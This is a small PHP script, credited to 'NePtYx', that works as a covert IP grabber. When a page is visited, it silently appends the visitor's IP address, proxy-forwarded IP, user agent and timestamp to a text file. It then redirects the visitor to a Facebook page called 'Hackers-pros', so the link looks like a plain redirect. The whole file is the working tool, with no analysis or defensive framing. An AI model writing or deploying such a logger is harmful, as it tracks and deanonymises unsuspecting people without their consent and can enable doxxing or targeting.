<?php
// Programado por NePtYx
$Fichero = "ip.txt";
$ip = $_SERVER["REMOTE_ADDR"];
$fecha = date("Y-m-d;H:i:s");
$sistema = $_SERVER['HTTP_USER_AGENT'];
$conproxy = $_SERVER["HTTP_X_FORWARDED_FOR"];
$log = "FECHA: $fecha SISTEMA: $sistema IP: $ip IPPROXY: $conproxy \x0D\x0A";
$fp = fopen($Fichero, "a" );
fwrite($fp, $log);
fclose($fp);
?>
<?php
header('Location: https://m.facebook.com/pg/Hackers-pros-1905888489733242/posts/');
?>
